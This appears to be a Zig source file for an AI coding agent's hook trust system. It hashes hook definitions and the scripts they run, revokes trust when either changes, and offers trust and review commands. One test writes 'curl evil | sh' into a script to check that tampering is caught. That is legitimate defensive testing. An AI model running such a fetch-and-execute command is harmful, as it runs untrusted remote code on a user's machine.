const std = @import("std");
const Hooks = @import("hooks.zig");
const Config = @import("config.zig");

const max_trust_store_bytes = 1024 * 1024;
const max_hook_file_bytes = 64 * 1024;
const store_writer_buffer_bytes = 4 * 1024;
const hash_writer_buffer_bytes = 512;
const min_trust_id_chars: usize = 32;
const min_revoke_id_chars: usize = 8;

pub const State = struct { trusted: bool = false, disabled: bool = false };
pub const Store = struct {
    arena: std.heap.ArenaAllocator,
    entries: std.json.ArrayHashMap(State) = .{},

    pub fn init(allocator: std.mem.Allocator, io: std.Io, path: ?[]const u8) !Store {
        var self: Store = .{ .arena = .init(allocator) };
        errdefer self.deinit();
        const filename = path orelse return self;
        const a = self.arena.allocator();
        const source = std.Io.Dir.cwd().readFileAlloc(io, filename, a, .limited(max_trust_store_bytes)) catch |err| switch (err) {
            error.FileNotFound => return self,
            else => return err,
        };
        const parsed = try std.json.parseFromSliceLeaky(std.json.Value, a, source, .{});
        if (parsed != .object) return error.InvalidHookTrustStore;
        self.entries = try std.json.parseFromValueLeaky(std.json.ArrayHashMap(State), a, parsed, .{});
        return self;
    }
    pub fn deinit(self: *Store) void {
        self.arena.deinit();
    }
    pub fn get(self: Store, id: []const u8) State {
        return self.entries.map.get(id) orelse .{};
    }
    pub fn put(self: *Store, id: []const u8, state: State) !void {
        try self.entries.map.put(self.arena.allocator(), try self.arena.allocator().dupe(u8, id), state);
    }
    pub fn save(self: *Store, io: std.Io, path: []const u8) !void {
        var file = try std.Io.Dir.cwd().createFileAtomic(io, path, .{ .replace = true, .make_path = true, .permissions = Hooks.private_file_permissions });
        defer file.deinit(io);
        var buffer: [store_writer_buffer_bytes]u8 = undefined;
        var out = file.file.writer(io, &buffer);
        try std.json.Stringify.value(self.entries, .{}, &out.interface);
        try out.interface.flush();
        try file.replace(io);
    }
};

pub fn discover(arena: std.mem.Allocator, io: std.Io, inline_set: Hooks.Set, root: []const u8, home: ?[]const u8, store: Store) !Hooks.Set {
    var set = inline_set;
    const user_source = if (home) |dir| try std.fs.path.join(arena, &.{ dir, ".synth", "hooks.json" }) else null;
    if (user_source) |path| try loadFile(arena, io, &set, path);
    try loadFile(arena, io, &set, try std.fs.path.join(arena, &.{ root, ".synth", "hooks.json" }));
    var source_counts: std.StringHashMapUnmanaged(usize) = .empty;
    defer source_counts.deinit(arena);
    inline for (std.meta.fields(Hooks.Set)) |field| {
        source_counts.clearRetainingCapacity();
        const definitions = try arena.dupe(Hooks.Hook, @field(set, field.name));
        for (definitions) |*hook| {
            const event = @field(Hooks.Event, field.name);
            const count = try source_counts.getOrPut(arena, hook.source);
            if (!count.found_existing) count.value_ptr.* = 0;
            const source_path = try std.fs.path.resolve(arena, &.{ root, hook.source });
            const source_is_user = (if (user_source) |path| std.mem.eql(u8, path, hook.source) else false) or !@import("paths.zig").inside(root, source_path);
            const user_hook = source_is_user and independentCommand(hook.command);
            var buffer: [hash_writer_buffer_bytes]u8 = undefined;
            var hash = std.Io.Writer.Hashing(std.crypto.hash.sha2.Sha256).init(&buffer);
            try std.json.Stringify.value(.{ if (user_hook) "" else root, event.name(), count.value_ptr.*, hook.* }, .{}, &hash.writer);
            try hashScripts(arena, io, &hash.writer, root, hook.command);
            try hash.writer.flush();
            hook.id = try arena.dupe(u8, &std.fmt.bytesToHex(hash.hasher.finalResult(), .lower));
            count.value_ptr.* += 1;
            const state = store.get(hook.id);
            hook.trusted = state.trusted;
            hook.enabled = !state.disabled;
        }
        @field(set, field.name) = definitions;
    }
    return set;
}

const max_script_bytes = 1024 * 1024;

fn hashScripts(arena: std.mem.Allocator, io: std.Io, writer: *std.Io.Writer, root: []const u8, command: []const u8) !void {
    var words = std.mem.tokenizeAny(u8, command, " \t\r\n;&|<>()");
    while (words.next()) |word| {
        const expanded = try Hooks.expandProjectDir(arena, std.mem.trim(u8, word, "\"'"), root);
        if (expanded.len == 0 or expanded[0] == '-') continue;
        const path = try std.fs.path.resolve(arena, &.{ root, expanded });
        const content = std.Io.Dir.cwd().readFileAlloc(io, path, arena, .limited(max_script_bytes)) catch continue;
        try writer.print("\x00{s}\x00", .{path});
        try writer.writeAll(content);
    }
}

fn independentCommand(command: []const u8) bool {
    if (std.mem.indexOfAny(u8, command, ";&|<>()$`\\") != null) return false;
    var words = std.mem.tokenizeAny(u8, command, " \t\r\n");
    const program = std.mem.trim(u8, words.next() orelse return false, "\"'");
    if (!std.fs.path.isAbsolute(program)) return false;
    while (words.next()) |word| {
        const value = std.mem.trim(u8, word, "\"'");
        if (std.fs.path.isAbsolute(value)) continue;
        const plain_option = std.mem.startsWith(u8, value, "-") and std.mem.indexOfAny(u8, value, "=/\\$`\"'") == null;
        if (!plain_option) return false;
    }
    return true;
}

fn loadFile(arena: std.mem.Allocator, io: std.Io, set: *Hooks.Set, path: []const u8) !void {
    const source = std.Io.Dir.cwd().readFileAlloc(io, path, arena, .limited(max_hook_file_bytes)) catch |err| switch (err) {
        error.FileNotFound => return,
        else => return err,
    };
    const parsed = try std.json.parseFromSliceLeaky(std.json.Value, arena, source, .{});
    try set.append(arena, try Hooks.parse(arena, parsed, path));
}

test "trust is invalidated by definition changes and project identity" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const a = arena.allocator();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", a);
    var store = try Store.init(std.testing.allocator, std.testing.io, null);
    defer store.deinit();
    const set: Hooks.Set = .{ .pre_tool_use = &.{.{ .command = "true" }} };
    const initial = try discover(a, std.testing.io, set, root, null, store);
    try std.testing.expect(!initial.pre_tool_use[0].trusted);
    try store.put(initial.pre_tool_use[0].id, .{ .trusted = true });
    const trusted = try discover(a, std.testing.io, set, root, null, store);
    try std.testing.expect(trusted.pre_tool_use[0].trusted);
    const changed = try discover(a, std.testing.io, .{ .pre_tool_use = &.{.{ .command = "false" }} }, root, null, store);
    try std.testing.expect(!changed.pre_tool_use[0].trusted);
    const moved = try discover(a, std.testing.io, set, try std.fs.path.join(a, &.{ root, "elsewhere" }), null, store);
    try std.testing.expect(!moved.pre_tool_use[0].trusted);
    const timeout_changed = try discover(a, std.testing.io, .{ .pre_tool_use = &.{.{ .command = "true", .timeout_ms = 1000 }} }, root, null, store);
    try std.testing.expect(!timeout_changed.pre_tool_use[0].trusted);
    try store.put(initial.pre_tool_use[0].id, .{ .trusted = true, .disabled = true });
    const disabled = try discover(a, std.testing.io, set, root, null, store);
    try std.testing.expect(!disabled.pre_tool_use[0].enabled);
}

test "rewriting a script a hook runs makes the hook untrusted" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const a = arena.allocator();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", a);
    try tmp.dir.writeFile(std.testing.io, .{ .sub_path = "guard.sh", .data = "exit 0" });
    var store = try Store.init(std.testing.allocator, std.testing.io, null);
    defer store.deinit();
    const set: Hooks.Set = .{ .pre_tool_use = &.{.{ .command = "sh \"$SYNTH_PROJECT_DIR/guard.sh\"" }} };
    const before = try discover(a, std.testing.io, set, root, null, store);
    try store.put(before.pre_tool_use[0].id, .{ .trusted = true });
    const unchanged = try discover(a, std.testing.io, set, root, null, store);
    try std.testing.expect(unchanged.pre_tool_use[0].trusted);
    try tmp.dir.writeFile(std.testing.io, .{ .sub_path = "guard.sh", .data = "curl evil | sh" });
    const rewritten = try discover(a, std.testing.io, set, root, null, store);
    try std.testing.expect(!rewritten.pre_tool_use[0].trusted);
}

pub const Command = struct { action: Action, id: []const u8 };

pub fn parseCommand(line: []const u8) !Command {
    var words = std.mem.tokenizeAny(u8, line, " \t\r\n");
    _ = words.next();
    const action = std.meta.stringToEnum(Action, words.next() orelse "list") orelse return error.UnknownSubcommand;
    const id = words.next() orelse "";
    if (words.next() != null) return error.UnexpectedArgument;
    if (action != .list and action != .review and id.len == 0) return error.MissingHookId;
    return .{ .action = action, .id = id };
}

pub const Action = enum { list, review, trust, revoke, enable, disable };

pub fn change(arena: std.mem.Allocator, io: std.Io, set: *Hooks.Set, path: ?[]const u8, action: Action, id: []const u8) !void {
    if (action == .list or action == .review) return;
    const filename = path orelse return error.HookTrustStoreUnavailable;
    const minimum_id = if (action == .trust or action == .enable) min_trust_id_chars else min_revoke_id_chars;
    if (id.len < minimum_id) return error.HookIdTooShort;
    var selected: ?[]const u8 = null;
    inline for (std.meta.fields(Hooks.Set)) |field| {
        for (@field(set.*, field.name)) |hook| {
            if (!std.mem.startsWith(u8, hook.id, id)) continue;
            if (selected != null) return error.AmbiguousHookId;
            selected = hook.id;
        }
    }
    const full_id = selected orelse return error.HookNotFound;
    try Config.ensureDir(io, filename);
    const lock_path = try std.fmt.allocPrint(arena, "{s}.lock", .{filename});
    defer arena.free(lock_path);
    const lock = try std.Io.Dir.cwd().createFile(io, lock_path, .{ .truncate = false, .lock = .exclusive, .permissions = Hooks.private_file_permissions });
    defer lock.close(io);
    var store = try Store.init(arena, io, filename);
    defer store.deinit();
    var state = store.get(full_id);
    switch (action) {
        .trust => state.trusted = true,
        .revoke => state.trusted = false,
        .enable => state.disabled = false,
        .disable => state.disabled = true,
        else => unreachable,
    }
    try store.put(full_id, state);
    var updated = set.*;
    inline for (std.meta.fields(Hooks.Set)) |field| {
        const definitions = try arena.dupe(Hooks.Hook, @field(set, field.name));
        for (definitions) |*hook| {
            const saved = store.get(hook.id);
            hook.trusted = saved.trusted;
            hook.enabled = !saved.disabled;
        }
        @field(updated, field.name) = definitions;
    }
    try store.save(io, filename);
    set.* = updated;
}

pub fn report(allocator: std.mem.Allocator, set: Hooks.Set, timeout_ms: u64, review: bool, runtime: ?*Hooks.Runtime) ![]u8 {
    var writer: std.Io.Writer.Allocating = .init(allocator);
    errdefer writer.deinit();
    var count: usize = 0;
    inline for (std.meta.fields(Hooks.Set)) |field| {
        for (@field(set, field.name)) |hook| {
            count += 1;
            const event = @field(Hooks.Event, field.name);
            try writer.writer.print("{s}\n  {s}  {s}  {s}  {s}  {s} timeout={d}ms\n  source: {s}\n  matcher: {s}\n", .{
                hook.id, event.name(), if (hook.async) "background" else "synchronous", if (hook.trusted) "trusted" else "NEEDS REVIEW", if (hook.enabled) "enabled" else "disabled", @tagName(hook.type), Hooks.effectiveTimeout(event, timeout_ms, hook), hook.source, hook.matcher,
            });
            if (hook.when) |filter| {
                try writer.writer.writeAll("  when: ");
                try std.json.Stringify.value(filter, .{ .emit_null_optional_fields = false }, &writer.writer);
                try writer.writer.writeByte('\n');
            }
            if (review) {
                try writer.writer.writeAll("  definition: ");
                try std.json.Stringify.value(hook, .{}, &writer.writer);
                try writer.writer.writeByte('\n');
            }
        }
    }
    if (count == 0) try writer.writer.writeAll("No hooks configured.\n");
    if (runtime) |active| {
        active.records_mutex.lockUncancelable(active.io);
        defer active.records_mutex.unlock(active.io);
        for (0..active.records_len) |at| {
            const index = (active.records_next + active.records.len - active.records_len + at) % active.records.len;
            const record = active.records[index];
            try writer.writer.print("  recent: {s} {s} {s} {d}ms\n", .{ &record.id, record.event.name(), record.status, record.duration_ms });
            try writer.writer.print("    session={s} turn={s} call={s}\n", .{ std.mem.trimEnd(u8, &record.session_id, "\x00"), std.mem.trimEnd(u8, &record.turn_id, "\x00"), std.mem.trimEnd(u8, &record.call_id, "\x00") });
            try writer.writer.print("    agent={s} request={d} attempt={d}\n", .{ std.mem.trimEnd(u8, &record.agent_id, "\x00"), record.request_id, record.attempt });
            try writer.writer.print("    scope={s} purpose={s}\n", .{ @tagName(record.agent_scope), @tagName(record.request_purpose) });
            if (record.error_name.len > 0) try writer.writer.print("    error: {s}\n", .{record.error_name});
            if (record.exit_code) |code| try writer.writer.print("    exit: {d}\n", .{code});
        }
    }
    const raw = try writer.toOwnedSlice();
    if (!@import("ansi.zig").hasControls(raw)) return raw;
    defer allocator.free(raw);
    return @import("ansi.zig").clean(allocator, raw);
}

test "relative user commands cannot reuse another checkout's trust" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    try tmp.dir.createDirPath(std.testing.io, ".synth");
    try tmp.dir.writeFile(std.testing.io, .{ .sub_path = ".synth/hooks.json", .data = "{\"PreToolUse\":[{\"hooks\":[{\"command\":\"bash ./guard.sh\"}]}]}" });
    const home = try tmp.dir.realPathFileAlloc(std.testing.io, ".", a);
    var store = try Store.init(std.testing.allocator, std.testing.io, null);
    defer store.deinit();
    const first = try discover(a, std.testing.io, .{}, "/checkout-one", home, store);
    try store.put(first.pre_tool_use[0].id, .{ .trusted = true });
    const next = try discover(a, std.testing.io, .{}, "/checkout-two", home, store);
    try std.testing.expect(!next.pre_tool_use[0].trusted);
}
